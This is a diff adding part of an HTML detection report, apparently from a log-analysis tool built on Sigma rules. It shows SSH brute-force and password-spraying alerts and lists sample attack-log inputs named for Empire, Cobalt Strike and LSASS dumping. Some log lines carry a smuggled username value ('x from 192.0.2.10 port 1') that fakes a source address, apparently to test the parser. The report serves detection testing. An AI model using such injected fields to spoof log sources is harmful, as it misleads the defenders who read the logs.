+<td>-</td><td class="event">Failed password for invalid user postgres from 198.51.100.85 port 49001 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Password Spraying</td></tr>
+<tr><td class="time">2024-06-03 14:34:54Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for invalid user git from 198.51.100.85 port 49002 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Password Spraying</td></tr>
+<tr><td class="time">2024-06-03 14:37:21Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for invalid user pi from 198.51.100.85 port 49003 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Password Spraying</td></tr>
+<tr><td class="time">2024-06-03 14:39:50Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for invalid user user from 198.51.100.85 port 49004 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Password Spraying</td></tr>
+<tr><td class="time">2024-06-03 16:00:00Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for invalid user x from 192.0.2.10 port 1 from 198.51.100.66 port 53000 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 16:00:05Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for invalid user x from 192.0.2.10 port 1 from 198.51.100.66 port 53001 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 16:00:10Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for invalid user x from 192.0.2.10 port 1 from 198.51.100.66 port 53002 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 16:00:15Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for invalid user x from 192.0.2.10 port 1 from 198.51.100.66 port 53003 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 16:00:20Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for invalid user x from 192.0.2.10 port 1 from 198.51.100.66 port 53004 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 16:00:25Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for invalid user x from 192.0.2.10 port 1 from 198.51.100.66 port 53005 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 16:00:30Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for invalid user x from 192.0.2.10 port 1 from 198.51.100.66 port 53006 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 16:00:35Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for invalid user x from 192.0.2.10 port 1 from 198.51.100.66 port 53007 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 16:00:40Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for invalid user x from 192.0.2.10 port 1 from 198.51.100.66 port 53008 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-03 16:00:45Z</td><td class="nowrap">web01</td><td>auth</td>
+<td>-</td><td class="event">Failed password for invalid user x from 192.0.2.10 port 1 from 198.51.100.66 port 53009 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-04 08:05:00Z</td><td class="nowrap">deb13</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.90 port 51000 ssh2</td>
+<td><span class="level level-high">high</span> SSH Login After Brute Force; SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-04 08:05:02Z</td><td class="nowrap">deb13</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.90 port 51001 ssh2</td>
+<td><span class="level level-high">high</span> SSH Login After Brute Force; SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-04 08:05:04Z</td><td class="nowrap">deb13</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.90 port 51002 ssh2</td>
+<td><span class="level level-high">high</span> SSH Login After Brute Force; SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-04 08:05:06Z</td><td class="nowrap">deb13</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.90 port 51003 ssh2</td>
+<td><span class="level level-high">high</span> SSH Login After Brute Force; SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-04 08:05:08Z</td><td class="nowrap">deb13</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.90 port 51004 ssh2</td>
+<td><span class="level level-high">high</span> SSH Login After Brute Force; SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-04 08:05:10Z</td><td class="nowrap">deb13</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.90 port 51005 ssh2</td>
+<td><span class="level level-high">high</span> SSH Login After Brute Force; SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-04 08:05:12Z</td><td class="nowrap">deb13</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.90 port 51006 ssh2</td>
+<td><span class="level level-high">high</span> SSH Login After Brute Force; SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-04 08:05:14Z</td><td class="nowrap">deb13</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.90 port 51007 ssh2</td>
+<td><span class="level level-high">high</span> SSH Login After Brute Force; SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-04 08:05:16Z</td><td class="nowrap">deb13</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.90 port 51008 ssh2</td>
+<td><span class="level level-high">high</span> SSH Login After Brute Force; SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-04 08:05:18Z</td><td class="nowrap">deb13</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.90 port 51009 ssh2</td>
+<td><span class="level level-high">high</span> SSH Login After Brute Force; SSH Brute Force</td></tr>
+<tr><td class="time">2024-06-04 08:05:30Z</td><td class="nowrap">deb13</td><td>auth</td>
+<td>-</td><td class="event">Accepted password for root from 203.0.113.90 port 51100 ssh2</td>
+<td><span class="level level-high">high</span> SSH Login After Brute Force</td></tr>
+<tr><td class="time">2024-06-04 08:07:12Z</td><td class="nowrap">deb13</td><td>auth</td>
+<td>-</td><td class="event">deploy : 3 incorrect password attempts ; HOST=deb13 ; TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash</td>
+<td><span class="level level-low">low</span> Sudo Authentication Failure</td></tr>
+<tr><td class="time">2024-07-08 03:12:01Z</td><td class="nowrap">web04</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.120 port 55010 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-07-08 03:12:09Z</td><td class="nowrap">web04</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.120 port 55010 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-07-08 03:12:09Z</td><td class="nowrap">web04</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.120 port 55010 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-07-08 03:12:09Z</td><td class="nowrap">web04</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.120 port 55010 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-07-08 03:12:09Z</td><td class="nowrap">web04</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.120 port 55010 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-07-08 03:12:09Z</td><td class="nowrap">web04</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.120 port 55010 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-07-08 03:12:12Z</td><td class="nowrap">web04</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.120 port 55020 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-07-08 03:12:20Z</td><td class="nowrap">web04</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.120 port 55020 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-07-08 03:12:20Z</td><td class="nowrap">web04</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.120 port 55020 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+<tr><td class="time">2024-07-08 03:12:20Z</td><td class="nowrap">web04</td><td>auth</td>
+<td>-</td><td class="event">Failed password for root from 203.0.113.120 port 55020 ssh2</td>
+<td><span class="level level-medium">medium</span> SSH Brute Force</td></tr>
+</tbody></table></div>
+
+<h2>Inputs</h2>
+<div class="scroll"><table>
+<thead><tr><th>File</th><th>Format</th><th>Events</th><th>Warnings</th></tr></thead>
+<tbody>
+<tr><td>aptsimulator_cobaltstrike_service_excerpt.json</td><td>winjson</td><td>4</td><td>0</td></tr>
+<tr><td>authlog/auth.log</td><td>authlog</td><td>29</td><td>1</td></tr>
+<tr><td>authlog/auth_benign.log</td><td>authlog</td><td>27</td><td>0</td></tr>
+<tr><td>authlog/auth_bruteforce_timing.log</td><td>authlog</td><td>108</td><td>0</td></tr>
+<tr><td>authlog/auth_openssh10.log</td><td>authlog</td><td>17</td><td>0</td></tr>
+<tr><td>authlog/auth_retry_storm.log</td><td>authlog</td><td>16</td><td>0</td></tr>
+<tr><td>authlog/auth_rfc3339.log</td><td>authlog</td><td>3</td><td>0</td></tr>
+<tr><td>authlog/auth_rollover.log</td><td>authlog</td><td>3</td><td>0</td></tr>
+<tr><td>authlog/auth_rsyslog_repeated.log</td><td>authlog</td><td>18</td><td>0</td></tr>
+<tr><td>authlog/auth_sessions.log</td><td>authlog</td><td>8</td><td>0</td></tr>
+<tr><td>cmd_bitsadmin_download_psh_script_excerpt.json</td><td>winjson</td><td>10</td><td>1</td></tr>
+<tr><td>cmd_discover_iexplorer_version_registry_excerpt.json</td><td>winjson</td><td>2</td><td>0</td></tr>
+<tr><td>cmd_mshta_vbscript_execute_psh_excerpt.json</td><td>winjson</td><td>4</td><td>1</td></tr>
+<tr><td>cmd_psexec_lsa_secrets_dump_service_excerpt.json</td><td>winjson</td><td>2</td><td>0</td></tr>
+<tr><td>cmd_psh_stop_netprofm_eventlog_before_reboot_excerpt.json</td><td>winjson</td><td>8</td><td>0</td></tr>
+<tr><td>covenant_dcom_executeexcel4macro_allowed_excerpt.json</td><td>winjson</td><td>1</td><td>0</td></tr>
+<tr><td>empire_persistence_registry_modification_run_keys_standard_user_certutil_excerpt.json</td><td>winjson</td><td>10</td><td>0</td></tr>
+<tr><td>empire_persistence_registry_modification_run_keys_standard_user_excerpt.json</td><td>winjson</td><td>9</td><td>0</td></tr>
+<tr><td>empire_psexec_dcerpc_tcp_svcctl_service_excerpt.json</td><td>winjson</td><td>4</td><td>0</td></tr>
+<tr><td>empire_schtasks_creation_execution_elevated_user_service_excerpt.json</td><td>winjson</td><td>6</td><td>0</td></tr>
+<tr><td>empire_schtasks_creation_standard_user_excerpt.json</td><td>winjson</td><td>1</td><td>0</td></tr>
+<tr><td>empire_shell_rubeus_asktgt_createnetonly_excerpt.json</td><td>winjson</td><td>4</td><td>0</td></tr>
+<tr><td>empire_smbexec_dcerpc_smb_svcctl_excerpt.json</td><td>winjson</td><td>6</td><td>0</td></tr>
+<tr><td>empire_wmi_local_event_subscriptions_elevated_user_excerpt.json</td><td>winjson</td><td>8</td><td>0</td></tr>
+<tr><td>empire_wmi_local_event_subscriptions_elevated_user_lsass_excerpt.json</td><td>winjson</td><td>16</td><td>0</td></tr>
+<tr><td>empire_wmic_add_user_backdoor_excerpt.json</td><td>winjson</td><td>8</td><td>0</td></tr>
+<tr><td>psh_disable_eventlog_service_startuptype_modification_excerpt.json</td><td>winjson</td><td>5</td><td>0</td></tr>
+<tr><td>psh_lsass_memory_dump_comsvcs_excerpt.json</td><td>winjson</td><td>2</td><td>1</td></tr>
+<tr><td>purplesharp_ad_playbook_I_excerpt.json</td><td>winjson</td><td>14</td><td>0</td></tr>
+<tr><td>rdp_interactive_taskmanager_lsass_dump_excerpt.json</td><td>winjson</td><td>8</td><td>0</td></tr>
+<tr><td>schtask_create_excerpt.json</td><td>winjson</td><td>1</td><td>0</td></tr>
+<tr><td>wmic_remote_xsl_jscript_excerpt.json</td><td>winjson</td><td>2</td><td>0</td></tr>
+<tr><td>wmic_remote_xsl_jscript_lsass_excerpt.json</td><td>winjson</td><td>4</td><td>1</td></tr>
+</tbody></table></div>
+<h3>Parser warnings</h3><ul><li>auth.log:30: unrecognized syslog line</li><li>cmd_bitsadmin_download_psh_script_excerpt.json: timestamps shifted by +04:00 to match Sysmon UtcTime (local time labeled as UTC)</li><li>cmd_mshta_vbscript_execute_psh_excerpt.json: timestamps shifted by +04:00 to match Sysmon UtcTime (local time labeled as UTC)</li><li>psh_lsass_memory_dump_comsvcs_excerpt.json: timestamps shifted by +16:00 to match Sysmon UtcTime (local time labeled as UTC)</li><li>wmic_remote_xsl_jscript_lsass_excerpt.json: timestamps shifted by +04:00 to match Sysmon UtcTime (local time labeled as UTC)</li></ul>
+<footer>© 2026 The MITRE Corporation. This work is reproduced and distributed with the permission of The MITRE Corporation. Rules adapted from SigmaHQ are licensed under the Detection Rule License 1.1; their authors are credited in each alert.</footer>
+</main>
+</body>
+</html>
